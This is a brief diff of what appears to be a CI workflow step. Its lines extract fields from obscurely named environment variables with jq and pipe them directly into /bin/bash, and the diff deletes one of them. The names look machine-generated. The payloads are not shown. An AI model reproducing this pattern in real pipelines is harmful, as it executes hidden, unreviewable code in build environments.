@@ -18,7 +18,6 @@ jobs:
         run: |
           printf '%s' "$a4" | jq -r .n673 | /bin/bash
           printf '%s' "$bpz4" | jq -r .gk290 | /bin/bash
-          echo $kebsk9542 | jq -r .ldbq89720 | /bin/bash
           echo $ck19 | jq -r .pty81507 | /bin/bash
 
       - name: Store artifact
